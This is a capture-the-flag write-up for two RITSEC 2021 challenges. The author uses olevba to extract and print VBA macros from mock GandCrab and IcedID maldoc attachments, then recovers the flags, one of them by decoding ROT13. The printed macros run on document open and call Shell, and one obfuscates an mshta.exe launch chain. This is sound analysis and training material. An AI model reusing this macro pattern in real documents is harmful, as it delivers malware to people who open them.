# PleaseClickAllTheThings 2

> NOTE: this challenge builds upon BegineersRITSEC.html, and that challenge must be completed first.
>
> GandCrab/Ursnif are dangerous types of campaigns and malware, macros are usually the entry point, see what you can find, there are two flags in this document. Flag1/2
>
> Author: Brandon Martin

In all these following challenges in the series, we need to investigate in those next attachments that we found in the previous email message

![image-20210413134437669](https://github.com/Ch3lLIST4/CTF-Writeups-2021/raw/main/RITSEC-CTF-2021/images/PleaseClickAllTheThings-1-1.png?raw=true)

For this one is the `GandCrab_Ursnif_RITSEC.docm` file

`GrandCrab` as you may already know is a pretty famous type of ransomware that encrypts a victim's files and demands ransom payment in order to regain access to their data. Taking a look at a file, it is showed to be a `.docm` file so I guessed the attacker is trying to deliver the ransomware via malicious MS Word macros

I used a very well crafted tool in the [oletools toolkits](https://github.com/decalage2/oletools) called [olevba](https://github.com/decalage2/oletools/wiki/olevba). After a quick installation of the toolkits on my Kali Linux virtual machine. I tried to extract the macros hidden inside the `.docm` file

```bash
hoangtran@hoangtran:~/Desktop$ olevba --show-pcode --decode GandCrab_Ursnif_RITSEC.docm
```

```
olevba 0.56.1 on Python 3.8.6 - http://decalage.info/python/oletools
===============================================================================
FILE: GandCrab_Ursnif_RITSEC.docm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module4.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/Module4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function TheDarkSide()
On Error Resume Next
CTF = Array(ElonMusk, StarWars, HelloWorld, Interaction.Shell(CleanString(Chewbacca.TextBox1), 43 - 43), Mars)
   Select Case Research
            Case 235003991
            CompetitorSkillz = That_of_a_Storm_Troopers_Aim_Research_Pending
            Flag = RITSEC{M@CROS}
            PendingResearch = Oct(Date + CStr(TimeStamp + Log(241371097) - PewPew / Hex(13775121)))
      End Select
End Function
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoopen()
TheDarkSide
End Sub
-------------------------------------------------------------------------------
P-CODE disassembly:
Processing file: GandCrab_Ursnif_RITSEC.docm
===============================================================================
Module streams:
VBA/ThisDocument - 938 bytes
VBA/Module4 - 1504 bytes
Line #0:
        FuncDefn (Function TheDarkSide())
Line #1:
        OnError (Resume Next) 
Line #2:
        Ld ElonMusk 
        Ld StarWars 
        Ld HelloWorld 
        Ld Chewbacca 
        MemLd TextBox1 
        ArgsLd CleanString 0x0001 
        LitDI2 0x002B 
        LitDI2 0x002B 
        Sub 
        Ld Interaction 
        ArgsMemLd Shell 0x0002 
        Ld Mars 
        ArgsArray Array 0x0005 
        St CTF 
Line #3:
        Ld Research 
        SelectCase 
Line #4:
        LitDI4 0xE057 0x0E01 
        Case 
        CaseDone 
Line #5:
        Ld That_of_a_Storm_Troopers_Aim_Research_Pending 
        St CompetitorSkillz 
Line #6:
        Reparse 0x0021 "            Flag = RITSEC{M@CROS}"
Line #7:
        Ld Date 
        Ld TimeStamp 
        LitDI4 0x07D9 0x0E63 
        ArgsLd Log 0x0001 
        Add 
        Ld PewPew 
        LitDI4 0x3111 0x00D2 
        ArgsLd Hex 0x0001 
        Div 
        Sub 
        Coerce (Str) 
        Add 
        ArgsLd Oct 0x0001 
        St PendingResearch 
Line #8:
        EndSelect 
Line #9:
        EndFunc 
VBA/Module1 - 975 bytes
Line #0:
        FuncDefn (Sub autoopen())
Line #1:
        ArgsCall TheDarkSide 0x0000 
Line #2:
        EndSub 

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|'#P\x03'           |23500399                                     |
|Hex String|'$\x13q\t'          |24137109                                     |
|Hex String|'\x13wQ!'           |13775121                                     |
+----------+--------------------+---------------------------------------------+
```

And the flag revealed in the hidden macro on `Line #6`, it is pretty straightforward

Flag : 

```
RITSEC{M@CROS}
```



# PleaseClickAllTheThings 3

> NOTE: this challenge builds upon BegineersRITSEC.html, and that challenge must be completed first.
>
> Stepping it up to IceID/Bokbot, this challenge is like the previous challenge but requires some ability to read and understand coding in addition to some additional decoding skills, there are two flags in this document. (Flag 1/2)
>
> Author: Brandon Martin

For this challenge on the `IceID_Bokbot_RITSEC.docm` attachment, which is the last attachment from the revealed Outlook message, I applied the same technique

```bash
hoangtran@hoangtran:~/Desktop$ olevba --show-pcode --decode IceID_Bokbot_RITSEC.docm
```

```
olevba 0.56.1 on Python 3.8.6 - http://decalage.info/python/oletools
===============================================================================
FILE: IceID_Bokbot_RITSEC.docm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Function aRXKz()
aRXKz = frm.txt.Text
End Function
Public Function aTwLcg(alRUYI)
aTwLcg = Replace(alRUYI, a7sVN, "")
End Function
Sub AutoOpen()
main
End Sub
Public Sub a8hv3(ai295)
End Sub
End Sub
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Const aHVWt As String = "p_:_\_j_v_a_q_b_j_f_\_f_l_f_g_r_z_3_2_\_z_f_u_g_n__r_k_r_"
Public Const aqv6tf As String = "EVGFRP{E0GG1ATZ@YP0Q3}"

Public Const a7sVN As String = "_"
Public Const asXlUN As Integer = -954 + 967
Public Function aENoBO(aHu95, avuEG8)
FileNumber = FreeFile
Open aHu95 For Output As #FileNumber
Print #FileNumber, Spc(-413 + 456)
Print #FileNumber, avuEG8
Print #FileNumber, Spc(-413 + 456)
Close #FileNumber
End Function
Sub aUoaN(adDgz, at09Aq)
FileCopy adDgz, at09Aq
End Sub
Function anPr56(aCl8i)
anPr56 = Len(aCl8i)
End Function
Function a79yA(aO0h5k)
a79yA = aO0h5k + 12324 / 474
End Function
Function aHScDO(aoza8) As String
Dim alc6yS As Long
Dim a9uRX As Integer
Dim agyvb As Integer
For alc6yS = 1 To anPr56(aoza8)
agyvb = 0
aFxdHY = VBA.Mid$(aoza8, alc6yS, 1)
a9uRX = Asc(aFxdHY)
If (a9uRX > 64 And a9uRX < 91) Or (a9uRX > 96 And a9uRX < 123) Then
agyvb = asXlUN
a9uRX = a9uRX - agyvb
If a9uRX < 97 And a9uRX > 83 Then
a9uRX = a79yA(a9uRX)
ElseIf a9uRX < 65 Then
a9uRX = a79yA(a9uRX)
End If
End If
Mid$(aoza8, alc6yS, 1) = VBA.Chr$(a9uRX)
Next
aHScDO = aoza8
End Function
-------------------------------------------------------------------------------
VBA MACRO Module2.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/Module2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub main()
auIPjp = aHScDO(aTwLcg(aHVWt))
aZuadn = aHScDO(aTwLcg(aqv6tf))
a9ANR = aHScDO(aTwLcg(aE0yGK))
aUoaN auIPjp, aZuadn
aENoBO a9ANR, aHScDO(aRXKz)
Shell aZuadn & " " & a9ANR
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub TextBox1_Change()

End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<!QBPGLCR ugzy>
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'<!QBPGLCR ugzy>'
-------------------------------------------------------------------------------
P-CODE disassembly:
Processing file: IceID_Bokbot_RITSEC.docm
===============================================================================
Module streams:
VBA/ThisDocument - 938 bytes
VBA/NewMacros - 1622 bytes
Line #0:
        FuncDefn (Sub AutoOpen())
Line #1:
        FuncDefn (Function aRXKz())
Line #2:
        Ld frm 
        MemLd txt 
        MemLd Text 
        St aRXKz 
Line #3:
        EndFunc 
Line #4:
        FuncDefn (Public Function aTwLcg(alRUYI))
Line #5:
        Ld alRUYI 
        Ld a7sVN 
        LitStr 0x0000 ""
        ArgsLd Replace 0x0003 
        St aTwLcg 
Line #6:
        EndFunc 
Line #7:
        FuncDefn (Sub AutoOpen())
Line #8:
        ArgsCall main 0x0000 
Line #9:
        EndSub 
Line #10:
        FuncDefn (Public Sub a8hv3(ai295))
Line #11:
        EndSub 
Line #12:
        EndSub 
VBA/Module1 - 3460 bytes
Line #0:
        Dim (Public Const) 
        LitStr 0x0039 "p_:_\_j_v_a_q_b_j_f_\_f_l_f_g_r_z_3_2_\_z_f_u_g_n__r_k_r_"
        VarDefn aHVWt (As String)
Line #1:
        Dim (Public Const) 
        LitStr 0x0016 "EVGFRP{E0GG1ATZ@YP0Q3}"
        VarDefn aqv6tf (As String)
Line #2:
Line #3:
        Dim (Public Const) 
        LitStr 0x0001 "_"
        VarDefn a7sVN (As String)
Line #4:
        Dim (Public Const) 
        LitDI2 0x03BA 
        UMi 
        LitDI2 0x03C7 
        Add 
        VarDefn asXlUN (As Integer)
Line #5:
        FuncDefn (Public Function aENoBO(aHu95))
Line #6:
        Ld FreeFile 
        St FileNumber 
Line #7:
        Ld aHu95 
        Ld FileNumber 
        Sharp 
        LitDefault 
        Open (For Output)
Line #8:
        Ld FileNumber 
        Sharp 
        PrintChan 
        LitDI2 0x019D 
        UMi 
        LitDI2 0x01C8 
        Add 
        PrintSpc 
        PrintNL 
Line #9:
        Ld FileNumber 
        Sharp 
        PrintChan 
        Ld avuEG8 
        PrintItemNL 
Line #10:
        Ld FileNumber 
        Sharp 
        PrintChan 
        LitDI2 0x019D 
        UMi 
        LitDI2 0x01C8 
        Add 
        PrintSpc 
        PrintNL 
Line #11:
        Ld FileNumber 
        Sharp 
        Close 0x0001 
Line #12:
        EndFunc 
Line #13:
        FuncDefn (Sub aUoaN(adDgz))
Line #14:
        Ld adDgz 
        Ld at09Aq 
        ArgsCall FileCopy 0x0002 
Line #15:
        EndSub 
Line #16:
        FuncDefn (Function anPr56(aCl8i))
Line #17:
        Ld aCl8i 
        FnLen 
        St anPr56 
Line #18:
        EndFunc 
Line #19:
        FuncDefn (Function a79yA(aO0h5k))
Line #20:
        Ld aO0h5k 
        LitDI2 0x3024 
        LitDI2 0x01DA 
        Div 
        Add 
        St a79yA 
Line #21:
        EndFunc 
Line #22:
        FuncDefn (Function aHScDO(aoza8) As String)
Line #23:
        Dim 
        VarDefn alc6yS (As Long)
Line #24:
        Dim 
        VarDefn a9uRX (As Integer)
Line #25:
        Dim 
        VarDefn agyvb (As Integer)
Line #26:
        StartForVariable 
        Ld alc6yS 
        EndForVariable 
        LitDI2 0x0001 
        Ld aoza8 
        ArgsLd anPr56 0x0001 
        For 
Line #27:
        LitDI2 0x0000 
        St agyvb 
Line #28:
        Ld aoza8 
        Ld alc6yS 
        LitDI2 0x0001 
        Ld VBA 
        ArgsMemLd Mid$ 0x0003 
        St aFxdHY 
Line #29:
        Ld aFxdHY 
        ArgsLd Asc 0x0001 
        St a9uRX 
Line #30:
        Ld a9uRX 
        LitDI2 0x0040 
        Gt 
        Ld a9uRX 
        LitDI2 0x005B 
        Lt 
        And 
        Paren 
        Ld a9uRX 
        LitDI2 0x0060 
        Gt 
        Ld a9uRX 
        LitDI2 0x007B 
        Lt 
        And 
        Paren 
        Or 
        IfBlock 
Line #31:
        Ld asXlUN 
        St agyvb 
Line #32:
        Ld a9uRX 
        Ld agyvb 
        Sub 
        St a9uRX 
Line #33:
        Ld a9uRX 
        LitDI2 0x0061 
        Lt 
        Ld a9uRX 
        LitDI2 0x0053 
        Gt 
        And 
        IfBlock 
Line #34:
        Ld a9uRX 
        ArgsLd a79yA 0x0001 
        St a9uRX 
Line #35:
        Ld a9uRX 
        LitDI2 0x0041 
        Lt 
        ElseIfBlock 
Line #36:
        Ld a9uRX 
        ArgsLd a79yA 0x0001 
        St a9uRX 
Line #37:
        EndIfBlock 
Line #38:
        EndIfBlock 
Line #39:
        Ld a9uRX 
        Ld VBA 
        ArgsMemLd Chr$ 0x0001 
        Ld aoza8 
        Ld alc6yS 
        LitDI2 0x0001 
        Mid 
Line #40:
        StartForVariable 
        Next 
Line #41:
        Ld aoza8 
        St aHScDO 
Line #42:
        EndFunc 
VBA/Module2 - 1159 bytes
Line #0:
        FuncDefn (Sub main())
Line #1:
        Ld aHVWt 
        ArgsLd aTwLcg 0x0001 
        ArgsLd aHScDO 0x0001 
        St auIPjp 
Line #2:
        Ld aqv6tf 
        ArgsLd aTwLcg 0x0001 
        ArgsLd aHScDO 0x0001 
        St aZuadn 
Line #3:
        Ld aE0yGK 
        ArgsLd aTwLcg 0x0001 
        ArgsLd aHScDO 0x0001 
        St a9ANR 
Line #4:
        Ld auIPjp 
        Ld aZuadn 
        ArgsCall aUoaN 0x0002 
Line #5:
        Ld a9ANR 
        Ld aRXKz 
        ArgsLd aHScDO 0x0001 
        ArgsCall aENoBO 0x0002 
Line #6:
        Ld aZuadn 
        LitStr 0x0001 " "
        Concat 
        Ld a9ANR 
        Concat 
        ArgsCall Shell 0x0001 
Line #7:
        EndSub 
VBA/UserForm1 - 1571 bytes
Line #0:
        FuncDefn (Sub TextBox1_Change())
Line #1:
Line #2:
        EndSub 

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|'b@ '              |6240E520                                     |
|Hex String|"B'$"            |C642DFE52724                                 |
|Hex String|'2Zh'              |32E85A68                                     |
|Hex String|'\x1a\u07b8\x04Q'  |1AEADEB80451                                 |
+----------+--------------------+---------------------------------------------+
```

This part `EVGFRP{E0GG1ATZ@YP0Q3}` on `Line #1` of `VBA/Module1` looks exactly like the flag format, with slightly different characters so I guessed it was a kind of letter substitution cipher. More specifically, **ROT13** cipher

I navigated to [a ROT13 decoder site](https://rot13.com/) and decode the string. Finally I got the flag

Flag :

```
RITSEC{R0TT1NGM@LC0D3}
```

